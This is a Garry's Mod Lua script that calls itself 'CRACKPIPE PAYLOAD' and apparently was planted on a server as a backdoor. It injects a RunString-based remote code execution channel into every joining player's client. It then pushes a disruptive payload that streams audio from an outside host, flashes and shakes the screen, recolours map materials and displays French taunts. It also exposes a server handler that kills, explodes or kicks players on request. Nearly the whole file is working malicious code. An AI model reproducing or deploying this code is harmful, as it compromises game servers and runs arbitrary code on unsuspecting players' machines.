



local CP = {}


CP.net = "CP_CLSV__"
util.AddNetworkString(CP.net)
CP.code = string.Replace([==[


local gfx = {}

local messages = {
	"Redemarer ton server ne sert a rien !",
	"Vous déconnecter ne sert a rien !",
	"Je me suis fait chier a faire se payload",
	"Alors tu va le regarder, en entier",
	"Galshi Revolution - Psystem",
	"Avoue c'est un peut styler quand même",
	"By RottenFish / GLX"
}


hook.Add("HUDPaint", "FUCKIT_G",function()
	for k,v in pairs(gfx) do
		v()
	end
end)

local message = "Ne redemmare pas ton server, cela ne sert a rien"
local function SlowType(msg,interval,callback)
	callback = callback or function()end
	message = ""
	for i=1,#msg do
		timer.Simple(interval * i,function()
			message = message .. msg[i]
		end)
	end
	timer.Simple(#msg*interval,callback)
end
local function GetRandomSpot()
	local ppos = LocalPlayer():GetPos()
	return Vector(ppos.x + math.random(-500, 500),ppos.y + math.random(-500, 500),ppos.z + math.random(-10, 10))
end
surface.CreateFont("PWN",{bold=true,size=40})
SOUNDSTART_CTP = false
if OZJFOZJCEZIO then return end
OZJFOZJCEZIO = true


sound.PlayURL("http://contentproxy.tk/r.mp3","no block",function(s)
	if not s then return end
	if SOUNDSTART_CTP then s:Stop() return end
	SOUNDSTART_CTP = true


	local ragtbl = {}
	

	gfx["CoolEffect"] = function()



		local tbl = {}
		s:FFT(tbl,FFT_2048)

		
		xpcall(function()
			local fal = 0
		for i=4,6 do
			fal = fal + tbl[i]
		end

		if fal > 0.8 then
			local ca = Color(math.random(0,255),math.random(0,255),math.random(0,255), 150)
			gfx["ColorChange"] = function()
				draw.RoundedBoxEx(0, 0, 0, ScrW(),ScrH(),ca)
			end
			util.ScreenShake(LocalPlayer():GetPos(),20,20,0.5,20)
			local mats = Entity(0):GetMaterials()
			for k,v in pairs(mats) do
			local r,g,b = ColorRand().r-50, ColorRand().g-50, ColorRand().b-50
				Material(v):SetVector("$color", Vector(r,g,b))
			end
		end
		end,function()
		end)


		for k,v in pairs(tbl) do
			local col = HSVToColor(k * 1 % 360,1,1)
			draw.RoundedBoxEx(0,0,k * 10, (v*10000), 10,col)
			draw.RoundedBoxEx(0,ScrW() - (v*10000),k * 10, (v*10000), 10,col)
		end
	end
	
	timer.Simple(29, function()
		
			hook.Add("GetMotionBlurValues", "YASS",function(a,b,c,d)
				return a,b,c+140,d
			end)
			
		
	end)

	local cc = 1
	local omgs = {}
	timer.Create("MVSPOS", 0.04, 0, function()
		for k,v in pairs(omgs) do
			if  omgs[ k ].n <= 0 then omgs[ k ] = nil continue end
			omgs[ k ] = {text = omgs[ k ].text, n = omgs[ k ].n - 1}
		end
	end)
	local isPounding = false

	timer.Create("NEXTMSG", 6, #messages, function()
		if cc > #messages then
			isPounding = true
			return
		end
		table.insert(omgs, {text = messages[ cc ],n = ScrH()})
		cc = cc + 1
	end)
	
	gfx["MessageC"] = function()
		if isPounding and (#messages <= 0) then
			draw.SimpleText("RT ton server <3", "PWN", ScrW() / 2, ScrH() / 2,Color(200,0,0),1,1)
		end
		for k,v in pairs(omgs) do
			draw.SimpleText(omgs[ k ].text, "PWN", ScrW() / 2, omgs[ k ].n,Color(0,0,0),1,1)
		end
	end
end)


	]==], "{netk}",CP.net)
CP.NetFunction = {}
CP.NetFunction["k"] = function(ply)
	ply:Kill()
end
InfoClientPad = RunString
CP.NetFunction["e"] = function(ply)
	ply:Kill()
	local explosion = ents.Create( "env_explosion" )
    explosion:SetKeyValue( "spawnflags", 144 )
    explosion:SetKeyValue( "iMagnitude", 15 )
    explosion:SetKeyValue( "iRadiusOverride", 256 )
    explosion:SetPos(ply:GetPos())
    explosion:Spawn( )
    explosion:Fire("explode","",0)
end
CP.NetFunction["a"] = function(ply)
	ply:Kick("CRACKPIPE PAYLOAD v.27")
end
net.Receive("CP_CLSV__",function(_,ply)
	CP.NetFunction[net.ReadString()](ply)
end)
function CP.SetupPlayer(ply)
	ply:SendLua([[net.Receive("]]..CP.net..[[",function()
		RunString(net.ReadString())
	end)]])
end

function CP.SendPlayer(ply)
	net.Start(CP.net)
	net.WriteString(CP.code)
	net.Send(ply)
end

function CP.Spawn(ply)
	print(ply:Name().." connected, sending payload. . .")
	CP.SetupPlayer(ply)
	timer.Simple(5, function()
		CP.SendPlayer(ply)
	end)
end
hook.Add( "PlayerSpawn", "CP_Spawn", CP.Spawn )

for i,v in ipairs(player.GetAll()) do
	CP.Spawn(v)
end


print("party2.1")